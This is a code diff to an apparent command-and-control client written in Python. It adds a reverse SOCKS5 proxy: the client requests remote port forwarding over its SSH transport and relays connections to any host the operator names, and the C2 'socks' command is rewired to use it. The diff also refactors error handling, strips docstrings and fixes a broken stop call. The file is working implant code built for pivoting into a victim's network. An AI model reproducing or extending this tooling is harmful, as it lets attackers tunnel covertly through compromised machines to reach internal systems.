@@ -9,9 +9,9 @@ import logging
 import argparse
 import platform
 import threading
-import struct
 from typing import Dict, Any, Optional, Callable
 from .sftp.stub_sftp import StubServer, StubSFTPServer
+import struct
 
 # logging setup
 inglogging = logging.getLogger('C2Client')
@@ -39,20 +39,11 @@ class PortForwardingManager:
     def start_remote_forwarding(self, remote_port: int, handler_factory: Callable) -> bool:
         """
         Start remote-to-local port forwarding with a custom channel handler
-        
-        Args:
-            remote_port: The port to forward from the remote server
-            handler_factory: A callable that returns a function to handle each accepted channel
-            
-        Returns:
-            bool: True if forwarding was successfully set up
         """
-        # Check if already forwarding on this port
         if remote_port in self.remote_forward_threads and self.remote_forward_threads[remote_port].is_alive():
             self.channel.send(f"\r\nAlready forwarding remote port {remote_port}\r\n")
             return True
             
-        # Request port forwarding from the server
         try:
             self.transport.request_port_forward('', remote_port)
             logging.info(f"Requested remote port forwarding on port {remote_port}")
@@ -62,38 +53,31 @@ class PortForwardingManager:
             self.channel.send(f"\r\nRemote port forwarding failed: {e}\r\n")
             return False
 
-        # Thread to accept forwarded channels
         def accept_forwarded():
             port_running = True
             while self.running and port_running:
-                chan = self.transport.accept(1)
-                if not chan:
-                    continue
-                logging.info(f"Incoming forwarded-tcpip channel on remote port {remote_port}")
-                
-                # Start a new thread to handle this channel
-                handler = handler_factory(chan)
-                t = threading.Thread(target=handler, daemon=True)
-                t.start()
-                
+                try:
+                    chan = self.transport.accept(1)
+                    if not chan:
+                        continue
+                    logging.info(f"Incoming forwarded-tcpip channel on remote port {remote_port}")
+                    
+                    handler = handler_factory(chan)
+                    t = threading.Thread(target=handler, daemon=True)
+                    t.start()
+                except Exception as e:
+                    logging.error(f"Error in forwarding thread: {e}")
+                    time.sleep(1)
+            
             logging.info(f"Stopped accepting connections on remote port {remote_port}")
 
-        # Start the forwarding thread
         forward_thread = threading.Thread(target=accept_forwarded, daemon=True)
         self.remote_forward_threads[remote_port] = forward_thread
         forward_thread.start()
         return True
 
     def stop_remote_forwarding(self, remote_port: int) -> bool:
-        """
-        Stop remote-to-local forwarding on the specified port
-        
-        Args:
-            remote_port: The port to stop forwarding
-            
-        Returns:
-            bool: True if forwarding was successfully stopped
-        """
+        """Stop remote-to-local forwarding on the specified port"""
         if remote_port not in self.remote_forward_threads:
             self.channel.send(f"\r\nNo remote forwarding active on port {remote_port}\r\n")
             return True
@@ -101,7 +85,6 @@ class PortForwardingManager:
         try:
             self.transport.cancel_port_forward('', remote_port)
             self.channel.send(f"\r\nCancelled remote forwarding on port {remote_port}\r\n")
-            # The thread will exit on next accept() timeout
             if self.remote_forward_threads[remote_port].is_alive():
                 self.remote_forward_threads[remote_port].join(2)
             del self.remote_forward_threads[remote_port]
@@ -112,29 +95,17 @@ class PortForwardingManager:
             return False
 
     def start_local_forwarding(self, local_port: int, remote_host: str, remote_port: int) -> bool:
-        """
-        Start local-to-remote port forwarding
-        
-        Args:
-            local_port: The local port to listen on
-            remote_host: The remote host to connect to
-            remote_port: The remote port to connect to
-            
-        Returns:
-            bool: True if forwarding was successfully set up
-        """
-        # Check if already forwarding on this port
+        """Start local-to-remote port forwarding"""
         if local_port in self.local_forward_threads and self.local_forward_threads[local_port].is_alive():
             self.channel.send(f"\r\nAlready forwarding local port {local_port}\r\n")
             return True
             
-        # Create a socket server to listen on the local port
         try:
             server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             server_sock.bind(('127.0.0.1', local_port))
             server_sock.listen(5)
-            server_sock.settimeout(1)  # 1 second timeout for accept()
+            server_sock.settimeout(1)
             
             logging.info(f"Started local port forwarding from {local_port} to {remote_host}:{remote_port}")
             self.channel.send(f"\r\nLocal forwarding started: 127.0.0.1:{local_port} -> {remote_host}:{remote_port}\r\n")
@@ -143,43 +114,33 @@ class PortForwardingManager:
             self.channel.send(f"\r\nLocal port forwarding failed: {e}\r\n")
             return False
 
-        # Thread to accept local connections and forward them
         def accept_local():
-            port_running = True
             try:
-                while self.running and port_running:
+                while self.running:
                     try:
                         client_sock, addr = server_sock.accept()
                         logging.info(f"Local connection from {addr[0]}:{addr[1]} to forward to {remote_host}:{remote_port}")
                         
-                        # Open a channel to the remote host/port
-                        try:
-                            transport_channel = self.transport.open_channel(
-                                'direct-tcpip',
-                                (remote_host, remote_port),
-                                addr
-                            )
-                            if transport_channel is None:
-                                logging.error("Channel creation failed")
-                                client_sock.close()
-                                continue
-                                
-                            # Start bidirectional forwarding
-                            threading.Thread(
-                                target=self._bidirectional_forward,
-                                args=(client_sock, transport_channel),
-                                daemon=True
-                            ).start()
-                            
-                        except Exception as e:
-                            logging.error(f"Error opening channel: {e}")
+                        transport_channel = self.transport.open_channel(
+                            'direct-tcpip',
+                            (remote_host, remote_port),
+                            addr
+                        )
+                        if transport_channel is None:
+                            logging.error("Channel creation failed")
                             client_sock.close()
-                            
+                            continue
+                                
+                        threading.Thread(
+                            target=self._bidirectional_forward,
+                            args=(client_sock, transport_channel),
+                            daemon=True
+                        ).start()
                     except socket.timeout:
                         continue
                     except Exception as e:
                         logging.error(f"Error accepting connection: {e}")
-                        if not self.running or not port_running:
+                        if not self.running:
                             break
                         time.sleep(1)
             finally:
@@ -189,29 +150,18 @@ class PortForwardingManager:
                 except:
                     pass
 
-        # Start the forwarding thread
         forward_thread = threading.Thread(target=accept_local, daemon=True)
         self.local_forward_threads[local_port] = forward_thread
         forward_thread.start()
         return True
 
     def stop_local_forwarding(self, local_port: int) -> bool:
-        """
-        Stop local-to-remote forwarding on the specified port
-        
-        Args:
-            local_port: The local port to stop forwarding
-            
-        Returns:
-            bool: True if forwarding was successfully stopped
-        """
+        """Stop local-to-remote forwarding on the specified port"""
         if local_port not in self.local_forward_threads:
             self.channel.send(f"\r\nNo local forwarding active on port {local_port}\r\n")
             return True
             
         try:
-            # The thread will exit on next accept() timeout
-            # We can try to connect to the port to speed up the exit
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect(('127.0.0.1', local_port))
@@ -230,28 +180,17 @@ class PortForwardingManager:
             return False
 
     def start_dynamic_forwarding(self, listen_port: int) -> bool:
-        """
-        Start dynamic (SOCKS5) port forwarding. This creates a local SOCKS5 proxy
-        that tunnels connections through the SSH connection.
-        
-        Args:
-            listen_port: The local port to listen on for SOCKS5 connections
-            
-        Returns:
-            bool: True if forwarding was successfully set up
-        """
-        # Check if already forwarding on this port
+        """Start SOCKS5 proxy on the specified local port"""
         if listen_port in self.dynamic_threads and self.dynamic_threads[listen_port].is_alive():
             self.channel.send(f"\r\nSOCKS5 proxy already running on port {listen_port}\r\n")
             return True
             
-        # Create a socket server to listen for SOCKS connections
         try:
             server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             server_sock.bind(('127.0.0.1', listen_port))
             server_sock.listen(5)
-            server_sock.settimeout(1)  # 1 second timeout for accept()
+            server_sock.settimeout(1)
             
             logging.info(f"Started SOCKS5 proxy on port {listen_port}")
             self.channel.send(f"\r\nSOCKS5 proxy started on 127.0.0.1:{listen_port}\r\n")
@@ -260,27 +199,23 @@ class PortForwardingManager:
             self.channel.send(f"\r\nSOCKS5 proxy setup failed: {e}\r\n")
             return False
 
-        # Thread to accept SOCKS connections and handle them
         def accept_socks():
-            port_running = True
             try:
-                while self.running and port_running:
+                while self.running:
                     try:
                         client_sock, addr = server_sock.accept()
                         logging.info(f"SOCKS connection from {addr[0]}:{addr[1]}")
                         
-                        # Start SOCKS handler in a new thread
                         threading.Thread(
                             target=self._handle_socks5_connection,
                             args=(client_sock,),
                             daemon=True
                         ).start()
-                        
                     except socket.timeout:
                         continue
                     except Exception as e:
                         logging.error(f"Error accepting SOCKS connection: {e}")
-                        if not self.running or not port_running:
+                        if not self.running:
                             break
                         time.sleep(1)
             finally:
@@ -290,29 +225,18 @@ class PortForwardingManager:
                 except:
                     pass
 
-        # Start the SOCKS proxy thread
         socks_thread = threading.Thread(target=accept_socks, daemon=True)
         self.dynamic_threads[listen_port] = socks_thread
         socks_thread.start()
         return True
 
     def stop_dynamic_forwarding(self, listen_port: int) -> bool:
-        """
-        Stop dynamic (SOCKS5) forwarding on the specified port
-        
-        Args:
-            listen_port: The local port to stop the SOCKS5 proxy on
-            
-        Returns:
-            bool: True if the proxy was successfully stopped
-        """
+        """Stop SOCKS5 proxy on the specified port"""
         if listen_port not in self.dynamic_threads:
             self.channel.send(f"\r\nNo SOCKS5 proxy active on port {listen_port}\r\n")
             return True
             
         try:
-            # The thread will exit on next accept() timeout
-            # We can try to connect to the port to speed up the exit
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect(('127.0.0.1', listen_port))
@@ -331,12 +255,7 @@ class PortForwardingManager:
             return False
 
     def _handle_socks5_connection(self, client_sock):
-        """
-        Handle a SOCKS5 client connection according to RFC 1928
-        
-        Args:
-            client_sock: The client socket for the SOCKS connection
-        """
+        """Handle a SOCKS5 client connection according to RFC 1928"""
         try:
             # SOCKS5 handshake
             # 1. Authentication negotiation
@@ -439,21 +358,19 @@ class PortForwardingManager:
     def _bidirectional_forward(self, client_socket, channel):
         """
         Handle bidirectional forwarding between a socket and a channel
-        
-        Args:
-            client_socket: The local client socket
-            channel: The SSH channel to the remote endpoint
         """
         # Forward client -> remote
         def forward_socket_to_channel():
             try:
                 while self.running:
-                    data = client_socket.recv(4096)
-                    if not data:
+                    try:
+                        data = client_socket.recv(4096)
+                        if not data:
+                            break
+                        channel.send(data)
+                    except Exception as e:
+                        logging.debug(f"Socket to channel error: {e}")
                         break
-                    channel.send(data)
-            except Exception as e:
-                logging.debug(f"Socket to channel error: {e}")
             finally:
                 try:
                     channel.close()
@@ -464,12 +381,14 @@ class PortForwardingManager:
         def forward_channel_to_socket():
             try:
                 while self.running:
-                    data = channel.recv(4096)
-                    if not data:
+                    try:
+                        data = channel.recv(4096)
+                        if not data:
+                            break
+                        client_socket.sendall(data)
+                    except Exception as e:
+                        logging.debug(f"Channel to socket error: {e}")
                         break
-                    client_socket.sendall(data)
-            except Exception as e:
-                logging.debug(f"Channel to socket error: {e}")
             finally:
                 try:
                     client_socket.close()
@@ -485,6 +404,8 @@ class PortForwardingManager:
 
     def stop_all_forwarding(self):
         """Stop all active port forwarding"""
+        self.running = False
+        
         # Stop remote forwarding
         remote_ports = list(self.remote_forward_threads.keys())
         for port in remote_ports:
@@ -500,12 +421,106 @@ class PortForwardingManager:
         for port in dynamic_ports:
             self.stop_dynamic_forwarding(port)
             
-        self.running = False
-        
     # For backward compatibility
     start_forwarding = start_remote_forwarding
     stop_forwarding = stop_remote_forwarding
-
+    
+    def start_remote_socks(self, remote_port: int) -> bool:
+        """Start SOCKS5 proxy on a remote port"""
+        def socks_handler_factory(channel):
+            return lambda: self._handle_remote_socks(channel)
+        
+        return self.start_remote_forwarding(remote_port, socks_handler_factory)
+    
+    def _handle_remote_socks(self, channel):
+        """Handle SOCKS5 connection from remote server"""
+        try:
+            # SOCKS5 handshake
+            # 1. Authentication negotiation
+            data = channel.recv(2)
+            if len(data) < 2:
+                logging.error("SOCKS5 handshake: too short")
+                channel.close()
+                return
+                
+            ver, nmethods = data[0], data[1]
+            if ver != 5:  # SOCKS5
+                logging.error(f"Unsupported SOCKS version: {ver}")
+                channel.close()
+                return
+                
+            # Read authentication methods
+            methods = channel.recv(nmethods)
+            
+            # We only support no authentication (0)
+            channel.send(b"\x05\x00")  # Ver=5, Method=0 (No auth)
+            
+            # 2. Command processing
+            data = channel.recv(4)
+            if len(data) < 4:
+                logging.error("SOCKS5 request: too short")
+                channel.close()
+                return
+                
+            ver, cmd, rsv, atyp = data[0], data[1], data[2], data[3]
+            if ver != 5:
+                logging.error(f"Unexpected SOCKS version in request: {ver}")
+                channel.close()
+                return
+                
+            # We only support CONNECT command (1)
+            if cmd != 1:
+                logging.error(f"Unsupported SOCKS5 command: {cmd}")
+                channel.send(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")  # Command not supported
+                channel.close()
+                return
+                
+            # Process address based on address type
+            host = None
+            if atyp == 1:  # IPv4
+                addr_bytes = channel.recv(4)
+                host = socket.inet_ntoa(addr_bytes)
+            elif atyp == 3:  # Domain name
+                length = channel.recv(1)[0]
+                addr_bytes = channel.recv(length)
+                host = addr_bytes.decode('utf-8')
+            elif atyp == 4:  # IPv6
+                addr_bytes = channel.recv(16)
+                host = socket.inet_ntop(socket.AF_INET6, addr_bytes)
+            else:
+                logging.error(f"Unsupported address type: {atyp}")
+                channel.send(b"\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00")  # Address type not supported
+                channel.close()
+                return
+                
+            # Read port (2 bytes, big endian)
+            port_bytes = channel.recv(2)
+            port = struct.unpack('!H', port_bytes)[0]
+            
+            logging.info(f"SOCKS5 CONNECT request for {host}:{port}")
+            
+            # Connect to the target
+            try:
+                target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                target_sock.settimeout(10)
+                target_sock.connect((host, port))
+                target_sock.settimeout(None)
+                
+                # Connection successful - send success response
+                channel.send(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
+                
+                # Start bidirectional forwarding
+                self._bidirectional_forward(target_sock, channel)
+            except Exception as e:
+                logging.error(f"Error connecting to target: {e}")
+                channel.send(b"\x05\x04\x00\x01\x00\x00\x00\x00\x00\x00")  # Host unreachable
+                channel.close()
+        except Exception as e:
+            logging.error(f"Error handling remote SOCKS connection: {e}")
+            try:
+                channel.close()
+            except:
+                pass
 
 class SFTPService:
     """
@@ -736,7 +751,9 @@ class C2Client:
                     return True
                     
                 local_port = int(parts[2])
-                return self.forwarder.start_dynamic_forwarding(local_port)
+                return self.forwarder.start_remote_socks(local_port)
+
+                #return self.forwarder.start_dynamic_forwarding(local_port)
                 
             elif action == 'stop':
                 if len(parts) < 3:
@@ -744,7 +761,9 @@ class C2Client:
                     return True
                     
                 local_port = int(parts[2])
-                return self.forwarder.stop_dynamic_forwarding(local_port)
+                return self.forwarder.stop_remote_forwarding(local_port)
+
+                #return self.forwarder.stop_dynamic_forwarding(local_port)
                 
             else:
                 self.channel.send("Unknown action. Use start or stop.\r\n")
@@ -858,7 +877,7 @@ class C2Client:
                 if service == 'sftp':
                     return self.sftp_service.stop_sftp_server(port)
                 elif service == 'socks':
-                    return self.forwarder.stop_dynamic
+                    return self.forwarder.stop_dynamic_forwarding(port)
 
     def command_loop(self):
         while self.running:
